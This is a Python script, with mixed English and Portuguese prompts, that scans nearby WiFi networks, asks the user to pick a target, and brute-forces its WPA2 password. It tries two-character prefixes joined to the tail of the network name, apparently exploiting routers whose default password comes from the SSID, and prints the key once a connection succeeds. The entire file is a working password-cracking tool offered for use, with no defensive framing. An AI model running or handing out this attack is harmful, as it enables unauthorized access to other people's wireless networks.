import pywifi
import time
from pywifi import const


charec = ['A','B','C','D','E','F','1','2','3','4','5','6','7','8','9','0']

# WiFi scanner
def wifi_scan():
    # initialise wifi
    wifi = pywifi.PyWiFi()

    # use the first interface
    interface = wifi.interfaces()[0]

    # start scan
    interface.scan()
    for i in range(4):
        time.sleep(1)
        print('\rScanning WiFi, please wait...（' + str(3 - i), end='）')
    print('\rScan Completed！\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('No.', 'Strength', 'wifi name'))

    # Scan result，scan_results() returns a set, each being a wifi object
    bss = interface.scan_results()

    # a set storing wifi name
    wifi_name_set = set()
    for w in bss:
        # dealing with decoding
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)

    # store into a list sorted by signal strength
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # format output
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # return wifi list
    return wifi_name_list


def get_namepw(wifi):
    passwd = wifi[8:]
    return passwd


def crack_wifi(wifi_name, charec, passwd):
    cont = True

    print('\nLista de characteres que serão testados...')
    print(charec)

    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    interface.disconnect()

    while interface.status() == const.IFACE_CONNECTED:
        time.sleep(1)

    profile = pywifi.Profile()
    profile.ssid = wifi_name
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    while cont:
        for i in charec:
            for j in charec:
                sufix = i + j
                profile.key = sufix + passwd
                interface.remove_all_network_profiles()
                tmp_profile = interface.add_network_profile(profile)
                interface.connect(tmp_profile)

                if interface.status() == const.IFACE_CONNECTED:
                    print(f"\nConexão feita com sucesso! Password: {sufix + passwd}")
                    cont = False
                    break
                else:
                    print(f"\nTentando: {sufix + passwd}", end='')
                    time.sleep(1.5)
            if cont == False:
                break

def main():
    print("Starting Software...")
    time.sleep(3)
    wifi_list = wifi_scan()

    while True:
        try:
            target_num = int(input("Choose a target wifi > "))

            if target_num in range(len(wifi_list)):
                try:
                    confirmation_choose = str(input(f"O alvo é: {wifi_list[target_num][1]}, confirmar? [S/N] > "))
                    if confirmation_choose.lower() == 's':
                        passwd = get_namepw(wifi_list[target_num][1])
                        crack_wifi(wifi_list[target_num][1], charec, passwd)
                        break

                except ValueError:
                    print("Apenas [S/N]!")

        except ValueError:
            print("Apenas números!")

if __name__ == '__main__':
    main()